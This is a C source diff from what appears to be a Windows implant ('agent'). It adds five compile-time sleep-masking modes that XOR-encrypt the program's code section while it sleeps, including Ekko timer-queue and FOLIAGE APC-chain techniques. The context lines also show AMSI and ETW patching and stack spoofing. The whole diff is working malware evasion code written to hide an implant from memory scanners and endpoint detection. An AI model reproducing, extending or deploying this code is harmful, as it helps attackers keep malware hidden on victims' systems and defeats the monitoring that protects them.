@@ -10,8 +10,23 @@
 #endif
 
 
-typedef BOOL  (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
-typedef LONG  (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);
+/* ─── Compile-time sleep mask mode ────────────────────────────────────────
+ * 0 = none      — plain NtDelayExecution (default; safe for all transports)
+ * 1 = xor       — XOR .text during sleep; no page-protection change
+ * 2 = noaccess  — XOR .text + PAGE_NOACCESS (naïve; fragile on x64)
+ * 3 = ekko      — timer-queue callbacks; main thread parks in ntdll
+ * 4 = foliage   — APC chain on dedicated suspended thread
+ */
+#ifndef AGENT_SLEEP_MASK_MODE
+#define AGENT_SLEEP_MASK_MODE 0
+#endif
+
+/* ── Common typedefs (always compiled) ─────────────────────────────────── */
+typedef BOOL (WINAPI *VProt_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef LONG (WINAPI *NtDelay_t)(BOOLEAN, PLARGE_INTEGER);
+
+/* ── Ekko-specific typedefs (mode 3) ───────────────────────────────────── */
+#if AGENT_SLEEP_MASK_MODE == 3
 typedef HANDLE(WINAPI *CreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
 typedef BOOL  (WINAPI *SetEvent_t)(HANDLE);
 typedef BOOL  (WINAPI *CloseHandle_t)(HANDLE);
@@ -19,23 +34,55 @@ typedef HANDLE(WINAPI *CreateTimerQueue_t)(void);
 typedef BOOL  (WINAPI *CreateTimerQueueTimer_t)(PHANDLE, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD, DWORD, ULONG);
 typedef BOOL  (WINAPI *DeleteTimerQueueEx_t)(HANDLE, HANDLE);
 typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
+#endif
 
-/* All in .data/.bss — always accessible, even when .text is protected. */
-static VProt_t               g_VProt                 = NULL;
-static NtDelay_t             g_NtDelay               = NULL;
-static CreateEventA_t        g_CreateEvent           = NULL;
-static SetEvent_t            g_SetEvent              = NULL;
-static CloseHandle_t         g_CloseHandle           = NULL;
-static CreateTimerQueue_t    g_CreateTimerQueue      = NULL;
+/* ── FOLIAGE-specific typedefs (mode 4) ────────────────────────────────── */
+#if AGENT_SLEEP_MASK_MODE == 4
+typedef HANDLE(WINAPI *CreateEventA_t)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
+typedef BOOL  (WINAPI *SetEvent_t)(HANDLE);
+typedef BOOL  (WINAPI *CloseHandle_t)(HANDLE);
+typedef DWORD (WINAPI *WaitForSingleObject_t)(HANDLE, DWORD);
+typedef LONG  (NTAPI *NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE,
+                                           PVOID, PVOID, ULONG, SIZE_T, SIZE_T,
+                                           SIZE_T, PVOID);
+typedef LONG  (NTAPI *NtQueueApcThread_t)(HANDLE, PVOID, PVOID, PVOID, PVOID);
+typedef LONG  (NTAPI *NtAlertResumeThread_t)(HANDLE, PULONG);
+typedef LONG  (NTAPI *NtTestAlert_t)(void);
+#endif
+
+/* ── Globals in .data/.bss — always accessible even when .text is locked ─ */
+static NtDelay_t g_NtDelay = NULL;
+static void     *g_text    = NULL;   /* base of .text section */
+static SIZE_T    g_tsz     = 0;      /* size of .text section */
+
+#if AGENT_SLEEP_MASK_MODE >= 1
+static VProt_t   g_VProt   = NULL;
+#endif
+
+#if AGENT_SLEEP_MASK_MODE == 3
+static CreateEventA_t          g_CreateEvent           = NULL;
+static SetEvent_t              g_SetEvent              = NULL;
+static CloseHandle_t           g_CloseHandle           = NULL;
+static CreateTimerQueue_t      g_CreateTimerQueue      = NULL;
 static CreateTimerQueueTimer_t g_CreateTimerQueueTimer = NULL;
-static DeleteTimerQueueEx_t  g_DeleteTimerQueueEx    = NULL;
-static WaitForSingleObject_t g_WaitForSingleObject   = NULL;
-static void                 *g_text                  = NULL;
-static SIZE_T                g_tsz                   = 0;
-
-/* Context passed to both timer callbacks — lives in .data. */
+static DeleteTimerQueueEx_t    g_DeleteTimerQueueEx    = NULL;
+static WaitForSingleObject_t   g_WaitForSingleObject   = NULL;
 typedef struct { void *text; SIZE_T text_sz; HANDLE event; } EkkoCtx;
 static EkkoCtx g_ekko_ctx;
+#endif
+
+#if AGENT_SLEEP_MASK_MODE == 4
+static CreateEventA_t        g_CreateEvent        = NULL;
+static SetEvent_t            g_SetEvent           = NULL;
+static CloseHandle_t         g_CloseHandle        = NULL;
+static WaitForSingleObject_t g_WaitForSingleObject = NULL;
+static NtCreateThreadEx_t    g_NtCreateThreadEx   = NULL;
+static NtQueueApcThread_t    g_NtQueueApcThread   = NULL;
+static NtAlertResumeThread_t g_NtAlertResumeThread = NULL;
+static NtTestAlert_t         g_NtTestAlert        = NULL;
+typedef struct { void *text; SIZE_T text_sz; HANDLE event; DWORD ms; } FoliageCtx;
+static FoliageCtx g_foliage_ctx;
+#endif
 
 /* Count of active pipe-server conn_threads. When > 0, sleep_masked skips the
  * PAGE_NOACCESS step to avoid faulting threads executing in .text. */
@@ -443,41 +490,115 @@ void evasion_init(void) {
     patch_fn("amsi.dll",  "AmsiScanString");
     patch_fn("ntdll.dll", "EtwEventWrite");
 
-    HMODULE k32   = GetModuleHandleA("kernel32.dll");
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    g_VProt               = (VProt_t)              GetProcAddress(k32,   "VirtualProtect");
-    g_NtDelay             = (NtDelay_t)            GetProcAddress(ntdll, "NtDelayExecution");
-    g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32,   "CreateEventA");
-    g_SetEvent            = (SetEvent_t)           GetProcAddress(k32,   "SetEvent");
-    g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32,   "CloseHandle");
-    g_CreateTimerQueue    = (CreateTimerQueue_t)   GetProcAddress(k32,   "CreateTimerQueue");
-    g_CreateTimerQueueTimer = (CreateTimerQueueTimer_t)GetProcAddress(k32, "CreateTimerQueueTimer");
-    g_DeleteTimerQueueEx  = (DeleteTimerQueueEx_t) GetProcAddress(k32,   "DeleteTimerQueueEx");
-    g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32,   "WaitForSingleObject");
-    find_text();
+    g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
+
+#if AGENT_SLEEP_MASK_MODE >= 1
+    {
+        HMODULE k32 = GetModuleHandleA("kernel32.dll");
+        g_VProt = (VProt_t)GetProcAddress(k32, "VirtualProtect");
+        find_text();
+
+#if AGENT_SLEEP_MASK_MODE == 3
+        g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32, "CreateEventA");
+        g_SetEvent            = (SetEvent_t)           GetProcAddress(k32, "SetEvent");
+        g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32, "CloseHandle");
+        g_CreateTimerQueue    = (CreateTimerQueue_t)   GetProcAddress(k32, "CreateTimerQueue");
+        g_CreateTimerQueueTimer=(CreateTimerQueueTimer_t)GetProcAddress(k32,"CreateTimerQueueTimer");
+        g_DeleteTimerQueueEx  = (DeleteTimerQueueEx_t) GetProcAddress(k32, "DeleteTimerQueueEx");
+        g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32, "WaitForSingleObject");
+#endif /* mode 3 */
+
+#if AGENT_SLEEP_MASK_MODE == 4
+        g_CreateEvent         = (CreateEventA_t)       GetProcAddress(k32,   "CreateEventA");
+        g_SetEvent            = (SetEvent_t)           GetProcAddress(k32,   "SetEvent");
+        g_CloseHandle         = (CloseHandle_t)        GetProcAddress(k32,   "CloseHandle");
+        g_WaitForSingleObject = (WaitForSingleObject_t)GetProcAddress(k32,   "WaitForSingleObject");
+        g_NtCreateThreadEx    = (NtCreateThreadEx_t)   GetProcAddress(ntdll, "NtCreateThreadEx");
+        g_NtQueueApcThread    = (NtQueueApcThread_t)   GetProcAddress(ntdll, "NtQueueApcThread");
+        g_NtAlertResumeThread = (NtAlertResumeThread_t)GetProcAddress(ntdll, "NtAlertResumeThread");
+        g_NtTestAlert         = (NtTestAlert_t)        GetProcAddress(ntdll, "NtTestAlert");
+#endif /* mode 4 */
+    }
+#endif /* mode >= 1 */
+
     init_stack_spoof();
 }
 
-/* ── Ekko / FOLIAGE-style timer-based sleep masking ──────────────────────
+/* ══════════════════════════════════════════════════════════════════════════
+ * Sleep masking — all code in .evasn so it runs while .text is locked.
+ * All Windows API calls go through function pointers in .data to avoid
+ * hitting IAT thunks that would be in the encrypted/inaccessible .text.
  *
- * Root problem with the naive PAGE_NOACCESS approach: the x64 Windows
- * exception dispatcher reads .pdata (which points into .text) to find unwind
- * handlers whenever ANY exception occurs during sleep, including hardware
- * faults, timer APCs, and structured exception handling.  Setting .text to
- * PAGE_NOACCESS while the main thread is parked in NtDelayExecution makes
- * the dispatcher itself fault → process crash → RST.
- *
- * Correct pattern (Ekko/FOLIAGE/Havoc/Sliver):
- *   1. Main thread calls WaitForSingleObject and parks inside ntdll — its
- *      instruction pointer is in ntdll.dll, NOT in .text.
- *   2. Timer-pool thread 1 (due=0ms): XOR-encrypt .text + PAGE_NOACCESS.
- *   3. Timer-pool thread 2 (due=ms):  PAGE_EXECUTE_READWRITE + XOR-decrypt
- *      + PAGE_EXECUTE_READ + SetEvent to wake main thread.
- *
- * Both callbacks live in .evasn so they remain executable when .text is
- * PAGE_NOACCESS.  All Windows API calls go through function pointers in
- * .data, bypassing IAT thunks that would be in the encrypted .text.
+ * Mode 0 (none)     — plain NtDelayExecution; zero detection surface.
+ * Mode 1 (xor)      — XOR .text bytes then sleep (no page-prot change).
+ * Mode 2 (noaccess) — XOR .text + PAGE_NOACCESS; naïve, fragile on x64
+ *                     because the exception dispatcher reads .pdata→.text.
+ * Mode 3 (ekko)     — timer-queue threads do encrypt/decrypt; main thread
+ *                     parks in WaitForSingleObject inside ntdll.
+ * Mode 4 (foliage)  — dedicated suspended thread drains an APC chain that
+ *                     does encrypt→sleep→decrypt; main thread parks in
+ *                     WaitForSingleObject inside ntdll.
+ * ══════════════════════════════════════════════════════════════════════════
  */
+
+/* ── Helper: plain fallback sleep — used by all modes on error ─────────── */
+__attribute__((section(".evasn"), noinline))
+static void plain_sleep(DWORD ms) {
+    LARGE_INTEGER t;
+    t.QuadPart = -(LONGLONG)ms * 10000LL;
+    if (g_NtDelay) g_NtDelay(FALSE, &t); else Sleep(ms);
+}
+
+/* ─────────────────────────── MODE 1: XOR only ─────────────────────────── */
+#if AGENT_SLEEP_MASK_MODE == 1
+
+__attribute__((section(".evasn"), noinline))
+void sleep_masked(DWORD ms) {
+    if (!g_text || !g_VProt || !g_NtDelay) { plain_sleep(ms); return; }
+
+    unsigned char *text = (unsigned char*)g_text;
+    SIZE_T sz = g_tsz;
+    DWORD old;
+
+    /* Make .text writable; bail if blocked (HVCI) */
+    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old)) { plain_sleep(ms); return; }
+    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
+    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);   /* readable but garbled */
+
+    plain_sleep(ms);
+
+    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
+    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
+    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
+}
+
+/* ──────────────────────── MODE 2: PAGE_NOACCESS ───────────────────────── */
+#elif AGENT_SLEEP_MASK_MODE == 2
+
+__attribute__((section(".evasn"), noinline))
+void sleep_masked(DWORD ms) {
+    if (!g_text || !g_VProt || !g_NtDelay) { plain_sleep(ms); return; }
+    /* Skip while pipe-server threads execute in .text */
+    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
+
+    unsigned char *text = (unsigned char*)g_text;
+    SIZE_T sz = g_tsz;
+    DWORD old;
+
+    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old)) { plain_sleep(ms); return; }
+    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
+    g_VProt(text, sz, PAGE_NOACCESS, &old);
+
+    plain_sleep(ms);
+
+    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
+    for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
+    g_VProt(text, sz, PAGE_EXECUTE_READ, &old);
+}
+
+/* ─────────────────────────── MODE 3: EKKO ─────────────────────────────── */
+#elif AGENT_SLEEP_MASK_MODE == 3
 
 __attribute__((section(".evasn"), noinline))
 static VOID CALLBACK ekko_encrypt_cb(PVOID ctx, BOOLEAN unused) {
@@ -496,7 +617,6 @@ static VOID CALLBACK ekko_decrypt_cb(PVOID ctx, BOOLEAN unused) {
     EkkoCtx *c = (EkkoCtx*)ctx;
     unsigned char *t = (unsigned char*)c->text;
     DWORD old;
-    /* Restore .text before waking the main thread */
     g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old);
     for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
     g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
@@ -505,79 +625,146 @@ static VOID CALLBACK ekko_decrypt_cb(PVOID ctx, BOOLEAN unused) {
 
 __attribute__((section(".evasn"), noinline))
 void sleep_masked(DWORD ms) {
-    /* Fallback: unmasked sleep if init not called or pointers missing */
-    if (!g_text || !g_VProt || !g_NtDelay ||
-        !g_CreateEvent || !g_SetEvent || !g_CloseHandle ||
-        !g_CreateTimerQueue || !g_CreateTimerQueueTimer ||
-        !g_DeleteTimerQueueEx || !g_WaitForSingleObject) {
-        LARGE_INTEGER t;
-        t.QuadPart = -(LONGLONG)ms * 10000LL;
-        if (g_NtDelay) g_NtDelay(FALSE, &t);
-        return;
-    }
+    if (!g_text || !g_VProt || !g_NtDelay || !g_CreateEvent || !g_SetEvent ||
+        !g_CloseHandle || !g_CreateTimerQueue || !g_CreateTimerQueueTimer ||
+        !g_DeleteTimerQueueEx || !g_WaitForSingleObject)
+        { plain_sleep(ms); return; }
 
-    /* Skip masking while pipe-server conn_threads are running in .text */
-    if (InterlockedOr(&g_conn_thread_count, 0) > 0) {
-        LARGE_INTEGER t;
-        t.QuadPart = -(LONGLONG)ms * 10000LL;
-        g_NtDelay(FALSE, &t);
-        return;
-    }
+    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
 
-    /* Bail if VirtualProtect would be blocked (HVCI / code-integrity) */
-    {
-        DWORD probe;
-        if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) {
-            LARGE_INTEGER t;
-            t.QuadPart = -(LONGLONG)ms * 10000LL;
-            g_NtDelay(FALSE, &t);
-            return;
-        }
-        /* Immediately restore — we only probed */
-        g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
-    }
+    /* Probe VirtualProtect (HVCI check) */
+    DWORD probe;
+    if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
+    g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
 
-    /* Prepare shared context for the two timer callbacks */
-    g_ekko_ctx.text     = g_text;
-    g_ekko_ctx.text_sz  = g_tsz;
-    g_ekko_ctx.event    = g_CreateEvent(NULL, FALSE, FALSE, NULL);
-    if (!g_ekko_ctx.event) {
-        LARGE_INTEGER t;
-        t.QuadPart = -(LONGLONG)ms * 10000LL;
-        g_NtDelay(FALSE, &t);
-        return;
-    }
+    g_ekko_ctx.text    = g_text;
+    g_ekko_ctx.text_sz = g_tsz;
+    g_ekko_ctx.event   = g_CreateEvent(NULL, FALSE, FALSE, NULL);
+    if (!g_ekko_ctx.event) { plain_sleep(ms); return; }
 
-    HANDLE hQueue = g_CreateTimerQueue();
-    if (!hQueue) {
-        g_CloseHandle(g_ekko_ctx.event);
-        LARGE_INTEGER t;
-        t.QuadPart = -(LONGLONG)ms * 10000LL;
-        g_NtDelay(FALSE, &t);
-        return;
-    }
+    HANDLE hQ = g_CreateTimerQueue();
+    if (!hQ) { g_CloseHandle(g_ekko_ctx.event); plain_sleep(ms); return; }
 
     HANDLE hT1 = NULL, hT2 = NULL;
-    /* Timer 1: encrypt at T=0 ms (one-shot, runs in timer thread) */
-    g_CreateTimerQueueTimer(&hT1, hQueue,
-                            (WAITORTIMERCALLBACK)ekko_encrypt_cb,
+    g_CreateTimerQueueTimer(&hT1, hQ, (WAITORTIMERCALLBACK)ekko_encrypt_cb,
                             &g_ekko_ctx, 0, 0, WT_EXECUTEINTIMERTHREAD);
-    /* Timer 2: decrypt at T=ms (one-shot, runs in timer thread) */
-    g_CreateTimerQueueTimer(&hT2, hQueue,
-                            (WAITORTIMERCALLBACK)ekko_decrypt_cb,
+    g_CreateTimerQueueTimer(&hT2, hQ, (WAITORTIMERCALLBACK)ekko_decrypt_cb,
                             &g_ekko_ctx, ms, 0, WT_EXECUTEINTIMERTHREAD);
 
-    /* Park main thread inside ntdll — no .text return address is live here.
-     * Extra 5 s safety margin in case the timer fires late. */
     g_WaitForSingleObject(g_ekko_ctx.event, ms + 5000);
 
-    /* Wait for any in-progress callback to finish before freeing the queue.
-     * INVALID_HANDLE_VALUE as the second arg means "block until complete". */
-    g_DeleteTimerQueueEx(hQueue, (HANDLE)(LONG_PTR)(-1));
+    g_DeleteTimerQueueEx(hQ, (HANDLE)(LONG_PTR)(-1));
     g_CloseHandle(g_ekko_ctx.event);
     g_ekko_ctx.event = NULL;
-    /* .text is now RX and decrypted — ret is safe */
 }
+
+/* ─────────────────────────── MODE 4: FOLIAGE ──────────────────────────── */
+#elif AGENT_SLEEP_MASK_MODE == 4
+
+/* All three APC routines and the thread entry live in .evasn so they are
+ * reachable while .text is PAGE_NOACCESS. */
+
+__attribute__((section(".evasn"), noinline))
+static VOID NTAPI foliage_encrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
+    (void)a2; (void)a3;
+    FoliageCtx *c = (FoliageCtx*)ctx;
+    unsigned char *t = (unsigned char*)c->text;
+    DWORD old;
+    if (!g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old)) return;
+    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
+    g_VProt(t, c->text_sz, PAGE_NOACCESS, &old);
+}
+
+__attribute__((section(".evasn"), noinline))
+static VOID NTAPI foliage_sleep_apc(PVOID ctx, PVOID a2, PVOID a3) {
+    (void)a2; (void)a3;
+    FoliageCtx *c = (FoliageCtx*)ctx;
+    LARGE_INTEGER t;
+    t.QuadPart = -(LONGLONG)c->ms * 10000LL;
+    g_NtDelay(FALSE, &t);
+}
+
+__attribute__((section(".evasn"), noinline))
+static VOID NTAPI foliage_decrypt_apc(PVOID ctx, PVOID a2, PVOID a3) {
+    (void)a2; (void)a3;
+    FoliageCtx *c = (FoliageCtx*)ctx;
+    unsigned char *t = (unsigned char*)c->text;
+    DWORD old;
+    g_VProt(t, c->text_sz, PAGE_EXECUTE_READWRITE, &old);
+    for (SIZE_T i = 0; i < c->text_sz; i++) t[i] ^= 0xA7;
+    g_VProt(t, c->text_sz, PAGE_EXECUTE_READ, &old);
+    g_SetEvent(c->event);
+}
+
+/* Thread entry: drain the APC queue then exit. Lives in .evasn. */
+__attribute__((section(".evasn"), noinline))
+static DWORD WINAPI foliage_thread_entry(PVOID arg) {
+    (void)arg;
+    g_NtTestAlert();   /* process all queued APCs (encrypt→sleep→decrypt) */
+    return 0;
+}
+
+__attribute__((section(".evasn"), noinline))
+void sleep_masked(DWORD ms) {
+    if (!g_text || !g_VProt || !g_NtDelay || !g_CreateEvent || !g_SetEvent ||
+        !g_CloseHandle || !g_WaitForSingleObject || !g_NtCreateThreadEx ||
+        !g_NtQueueApcThread || !g_NtAlertResumeThread || !g_NtTestAlert)
+        { plain_sleep(ms); return; }
+
+    if (InterlockedOr(&g_conn_thread_count, 0) > 0) { plain_sleep(ms); return; }
+
+    DWORD probe;
+    if (!g_VProt(g_text, g_tsz, PAGE_EXECUTE_READWRITE, &probe)) { plain_sleep(ms); return; }
+    g_VProt(g_text, g_tsz, PAGE_EXECUTE_READ, &probe);
+
+    g_foliage_ctx.text    = g_text;
+    g_foliage_ctx.text_sz = g_tsz;
+    g_foliage_ctx.ms      = ms;
+    g_foliage_ctx.event   = g_CreateEvent(NULL, FALSE, FALSE, NULL);
+    if (!g_foliage_ctx.event) { plain_sleep(ms); return; }
+
+    /* Create thread suspended; it will drain the APC queue on alert-resume */
+    HANDLE hThread = NULL;
+    LONG status = g_NtCreateThreadEx(
+        &hThread,
+        0x1FFFFF,               /* THREAD_ALL_ACCESS */
+        NULL,
+        (HANDLE)(LONG_PTR)(-1), /* NtCurrentProcess() */
+        foliage_thread_entry,
+        NULL,
+        0x1,                    /* CREATE_SUSPENDED */
+        0, 0, 0, NULL);
+    if (status != 0 || !hThread) {
+        g_CloseHandle(g_foliage_ctx.event);
+        plain_sleep(ms);
+        return;
+    }
+
+    /* Queue APCs: encrypt → sleep → decrypt (FIFO order) */
+    g_NtQueueApcThread(hThread, foliage_encrypt_apc, &g_foliage_ctx, NULL, NULL);
+    g_NtQueueApcThread(hThread, foliage_sleep_apc,   &g_foliage_ctx, NULL, NULL);
+    g_NtQueueApcThread(hThread, foliage_decrypt_apc, &g_foliage_ctx, NULL, NULL);
+
+    /* Alert-resume: thread wakes and processes its APC queue */
+    g_NtAlertResumeThread(hThread, NULL);
+
+    /* Park main thread in ntdll until decrypt APC fires SetEvent */
+    g_WaitForSingleObject(g_foliage_ctx.event, ms + 10000);
+
+    g_CloseHandle(hThread);
+    g_CloseHandle(g_foliage_ctx.event);
+    g_foliage_ctx.event = NULL;
+}
+
+/* ───────────────────── MODE 0 (default): no masking ───────────────────── */
+#else /* AGENT_SLEEP_MASK_MODE == 0 */
+
+__attribute__((section(".evasn"), noinline))
+void sleep_masked(DWORD ms) {
+    plain_sleep(ms);
+}
+
+#endif /* AGENT_SLEEP_MASK_MODE */
 
 /* ── MEM_FLUCTUATE — periodic XOR scrambler daemon ─────────────────────── */
 
